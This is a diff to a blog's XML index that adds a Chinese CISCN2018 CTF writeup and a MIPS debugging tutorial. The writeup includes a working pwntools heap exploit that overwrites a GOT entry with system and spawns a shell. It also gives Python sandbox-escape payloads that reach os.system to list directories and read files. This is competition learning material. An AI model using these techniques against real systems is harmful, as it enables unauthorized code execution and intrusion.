@@ -3,6 +3,101 @@
   
     
     <entry>
+      <title><![CDATA[CISCN2018 Writeup]]></title>
+      <url>/2018/04/30/wp-2018-ciscn/</url>
+      <content type="html"><![CDATA[<h1 id="The-Lounge战队-CISCN2018-Writeup"><a href="#The-Lounge战队-CISCN2018-Writeup" class="headerlink" title="The Lounge战队 CISCN2018 Writeup"></a>The Lounge战队 CISCN2018 Writeup</h1><p><img src="/2018/04/30/wp-2018-ciscn/0.png" alt=""></p>
+<a id="more"></a>
+<h2 id="Pwn-Supermarket"><a href="#Pwn-Supermarket" class="headerlink" title="Pwn-Supermarket"></a>Pwn-Supermarket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(name,price,size,des):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;price:&quot;,str(price))</span><br><span class="line">	p.sendlineafter(&quot;descrip_size:&quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;description:&quot;,des)</span><br><span class="line"></span><br><span class="line">def listall():</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def delete(name):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line"></span><br><span class="line">def change_price(name,price):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;4&quot;)</span><br><span class="line">	p.sendafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;in:&quot;,str(price))</span><br><span class="line"></span><br><span class="line">def change_des(name,size,des):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;5&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;descrip_size:&quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;description:&quot;,des)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">atoi  0xf7643050  0xf75e4050</span><br><span class="line">puts  0xf75f4140  0xf7603140</span><br><span class="line">free  0xf765d750  0xf75af750</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">local=0</span><br><span class="line">if local:</span><br><span class="line">	p=process(&apos;./task_supermarket&apos;)</span><br><span class="line">	libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line">	atoi_offset=libc.symbols[&apos;atoi&apos;]</span><br><span class="line">	sys_offset=libc.symbols[&apos;system&apos;]</span><br><span class="line">else:</span><br><span class="line">	p=remote(&apos;117.78.27.192&apos;,32285)</span><br><span class="line">	atoi_offset=0x2d050</span><br><span class="line">	sys_offset=0x3a940</span><br><span class="line"></span><br><span class="line">add(&apos;aaaa&apos;,100,0x50,&apos;A&apos;*0x50)</span><br><span class="line">add(&apos;1111&apos;,100,0x50,&apos;A&apos;*0x50)</span><br><span class="line">add(&apos;b&apos;*12+&apos;\x41&apos;,100,0x38,&apos;B&apos;*0x38)</span><br><span class="line">add(&apos;cccc&apos;,100,0x60,&apos;C&apos;*0x60)</span><br><span class="line">add(&apos;dddd&apos;,100,0x20,&apos;D&apos;*0x20)</span><br><span class="line">delete(&apos;b&apos;*12+&apos;\x41&apos;)</span><br><span class="line">change_des(&apos;cccc&apos;,0x20,&apos;M&apos;*0x24+p32(0x41))</span><br><span class="line"></span><br><span class="line">add(&apos;eeee&apos;,100,0x38,&apos;EEEE&apos;)</span><br><span class="line">add(&apos;ffff&apos;,100,0x38,p32(101)+p32(0x38)+p32(0x804b048)+p32(0x41))</span><br><span class="line">listall()</span><br><span class="line">p.recvuntil(&quot;101, des.&quot;)</span><br><span class="line"></span><br><span class="line">data=p.recv(4)</span><br><span class="line">print data</span><br><span class="line">atoi_addr=u32(data.ljust(4,&apos;\x00&apos;))</span><br><span class="line">print hex(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base=atoi_addr-atoi_offset</span><br><span class="line">system=libc_base+sys_offset</span><br><span class="line">print &quot;system&quot;,hex(system)</span><br><span class="line"></span><br><span class="line">change_des(&apos;eeee&apos;,0x38,p64(system))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Web-EasyWeb"><a href="#Web-EasyWeb" class="headerlink" title="Web-EasyWeb"></a>Web-EasyWeb</h2><p>无力吐槽的题目，空密码。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/1.png" alt="">  </p>
+<p><img src="/2018/04/30/wp-2018-ciscn/2.png" alt="">  </p>
+<h2 id="Crypto-Flag-in-your-hand"><a href="#Crypto-Flag-in-your-hand" class="headerlink" title="Crypto-Flag_in_your_hand"></a>Crypto-Flag_in_your_hand</h2><p>基本逻辑很简单，看showFlag函数。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/3.png" alt="">  </p>
+<p>判断ic状态来决定是否是正确Token。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/4.png" alt="">  </p>
+<p>文件唯一有改动ic的地方就是这了，看一下逻辑。就是a数组所有值-3转成ASCII字符就是正确Token。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/5.png" alt="">  </p>
+<h2 id="Misc-寻找入侵者"><a href="#Misc-寻找入侵者" class="headerlink" title="Misc-寻找入侵者"></a>Misc-寻找入侵者</h2><p>用mac地址爆破出honey密码</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/6.png" alt=""></p>
+<p><img src="/2018/04/30/wp-2018-ciscn/7.png" alt="">    </p>
+<p>然后使用airdecap-ng提取出另一个数据包，在包里面发现出题人博客以及key.rar的下载地址，下载后解压得到key.pcap，发现可疑字符串，即为flag</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/8.png" alt="">  </p>
+<h2 id="Misc-Memory-Forensic"><a href="#Misc-Memory-Forensic" class="headerlink" title="Misc-Memory_Forensic"></a>Misc-Memory_Forensic</h2><p>很荣幸是三血。其实能更快。首先用IDA看一下逻辑。发现已经出现了”CISCN{“ “}” 和几个疑似flag的字符串，然后他会用snprintf去写内存，那么真flag应该会出现在内存中。<br>我是用的Vmware14配Mac OS High Siera，这样能拿到完整内存Dump。首先关闭System Integrity Protection，然后kextutil agent.kext加载，然后它会黑屏，在黑屏一瞬间切出去，暂停虚拟机。拿到整个内存Dump。然后用16进制编辑器搜索“CISCN{”就行。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/9.png" alt="">  </p>
+<h2 id="Misc-Picture"><a href="#Misc-Picture" class="headerlink" title="Misc-Picture"></a>Misc-Picture</h2><p>首先给了个假的PNG，其实是JPG。FFD9结尾处有数据，提出来，file一下发现是zlib数据，然后直接binwalk解压，给了个Base64字符串，解密后是KP什么的，还有Python code，当时想偏了，以为是PYC文件，修了半天发现格式全错。后来把头部改成PK，是个正常的ZIP文件。然后要密码。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/10.png" alt="">  </p>
+<p>注意右边注释，Python控制台报错？试一下。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/11.png" alt="">  </p>
+<p>没错，integer division or modulo by zero这是密码。成功解压后是个UUEncode，解密就行了。</p>
+<h2 id="Misc-验证码"><a href="#Misc-验证码" class="headerlink" title="Misc-验证码"></a>Misc-验证码</h2><p>没啥好说的，签到题，进去就有flag。</p>
+<h2 id="Misc-RUN"><a href="#Misc-RUN" class="headerlink" title="Misc-RUN"></a>Misc-RUN</h2><p>Python沙箱逃逸，试了很多Payload。所有的popen都会报unkonw error。所有的二阶<strong>dict</strong>也会报错，后来想到找一个<strong>globals</strong>。<br>x = [x for x in [].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() if x.<strong>name</strong> == ‘ca’+’tch_warnings’][0].<strong>init</strong><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;l&#39;+&#39;s&#39;">‘sy’+’stem’</a><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;l&#39;+&#39;s /home/ctf&#39;">‘sy’+’stem’</a><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;ca&#39;+&#39;t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;">‘sy’+’stem’</a></p>
+<h2 id="Reverse-RE"><a href="#Reverse-RE" class="headerlink" title="Reverse-RE"></a>Reverse-RE</h2><p>程序先检测flag格式头，然后根据“_”将内容分为三个部分，分别加密之后与字符串比较，前两个部分的内容很容易得到，解开md5值为tofu和gana，第三部分flag的MD5无法解开，卡了两三个小时，看到第三个函数与其他两个的区别是后面将大量数据写到一个叫“flag”的文件中，但是需要异或的两个key值，分别和数据奇数项和偶数项异或，因为看到第一个数据和第三个数据相同，猜测文件是jepg格式，果然解出来是张图片，连在一起即为完整flag.</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/12.png" alt="">  </p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[mips程序调试]]></title>
+      <url>/2018/04/30/mips/</url>
+      <content type="html"><![CDATA[<h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>由于我们通常的操作系统指令集都是x86的，所以无法跑MIPS程序。这时候就需要装QEMU来模拟，QEMU通过源码编译较为复杂，我们又没有特殊的需求，所以直接使用ubuntu的APT进行安装即可。</p>
+<p><img src="/2018/04/30/mips/1.png" alt=""></p>
+<a id="more"></a>
+<ul>
+<li>sudo apt install qemu</li>
+</ul>
+<p>由于MIPS架构有两种——大端MIPS和小端MIPS。所以，我们需要确定这个程序是大端MIPS还是小端MIPS。</p>
+<ul>
+<li>qemu-mips xxx   #大端</li>
+<li>qemu-mipsel xxx #小端</li>
+</ul>
+<p>远程调试MIPS程序，所以要加上-g 端口参数，qemu-mipsel -g 1234 baby_mips，此时用IDA pro就可以通过Remote GDB Server来调试这个MIPS程序。</p>
+<h1 id="0x02-反编译"><a href="#0x02-反编译" class="headerlink" title="0x02 反编译"></a>0x02 反编译</h1><p>为了方便我们了解key比对函数的功能，我们可以需要对MIPS进行反编译，目前可以反编译MIPS程序的工具有两个。</p>
+<pre><code>Retdec
+JEB-mips
+</code></pre><p>Retdec有在线反编译网址，retdec.com，也可以通过python api接口使用，比较方便，需要注册获得YOUR-API-KEY，注意retdec-python包需要在python3环境下运行</p>
+<pre><code>py 3 -m pip install retdec-python
+</code></pre><p>python用法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from retdec.decompiler import Decompiler</span><br><span class="line"></span><br><span class="line">decompiler = Decompiler(api_key=&apos;YOUR-API-KEY&apos;)</span><br><span class="line">decompilation = decompiler.start_decompilation(input_file=&apos;file.exe&apos;)</span><br><span class="line">decompilation.wait_until_finished()</span><br><span class="line">decompilation.save_hll_code()</span><br></pre></td></tr></table></figure>
+<p>或者命令行执行<br>    $ decompiler -k YOUR-API-KEY file.exe</p>
+<pre><code>v23bmYb67R
+----------
+
+Waiting for resources (0%)...                    [OK]
+Pre-Processing:
+  Obtaining file information (5%)...             [OK]
+  Unpacking (10%)...                             [OK]
+Front-End:
+  Initializing (20%)...                          [OK]
+[..]
+Done (100%)...
+
+Downloading:
+ - file.c
+</code></pre><p>这样就会把mips程序反编译成c的代码写成file.c文件了。</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> re </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Xman冬令营writeup]]></title>
       <url>/2018/01/07/wp-xmandly/</url>
       <content type="html"><![CDATA[<p><img src="/2018/01/07/wp-xmandly/tt.png" alt=""><br>做题一时爽，期末火葬场，一晚上水了三题，跪求期末不挂，老老实实去复习。祝各位表哥冬令营玩的开心。<br><a id="more"></a></p>
@@ -18,8 +113,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a*a-b*b=8(a+b)</span><br><span class="line">a-b=8</span><br><span class="line">a*a+a*b+b*b&gt;10000</span><br><span class="line">a*a+a*b-b*b&gt;10000</span><br><span class="line">gcd(a,b)=7</span><br></pre></td></tr></table></figure>
 <p>,写脚本爆破，发现就一组满足条件<br><img src="/2018/01/07/wp-xmandly/5.png" alt=""><br>根据a,b的值带入程序方程组很容易就能求出所有密文的值d2lu-bmVy-Y7hp-bgtl，即为flag。</p>
 <h1 id="神秘的TXT"><a href="#神秘的TXT" class="headerlink" title="神秘的TXT"></a>神秘的TXT</h1><p>发现有三个横坐标，三个纵坐标，因为是mobile题目，猜测对应着手机键盘密码。<br><img src="/2018/01/07/wp-xmandly/2.png" alt=""><br>因为不知道坐标顺序，所以把8种可能的反转情况都列出来，一个一个试，其中有一个是对的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">XCTF&#123;974856321&#125;</span><br><span class="line">XCTF&#123;932658741&#125;</span><br><span class="line">XCTF&#123;398652147&#125;</span><br><span class="line">XCTF&#123;178452369&#125;</span><br><span class="line">XCTF&#123;712458963&#125;</span><br><span class="line">XCTF&#123;314256987&#125;</span><br><span class="line">XCTF&#123;136254789&#125;</span><br><span class="line">XCTF&#123;796854123&#125;</span><br></pre></td></tr></table></figure></p>
-<p>好像是第四个，忘了。</p>
-<script type="text/javascript" src="http://www.xiami.com/widget/player-single?uid=0&sid=1317858&mode=js"></script>]]></content>
+<p>好像是第四个，忘了。  </p>
+<embed src="http://www.xiami.com/widget/0_1317858/singlePlayer.swf" type="application/x-shockwave-flash" width="257" height="33" wmode="transparent">]]></content>
       
         
     </entry>
@@ -36,9 +131,9 @@
         
         <tags>
             
-            <tag> 课程 </tag>
-            
             <tag> 警察 </tag>
+            
+            <tag> 课程 </tag>
             
         </tags>
         
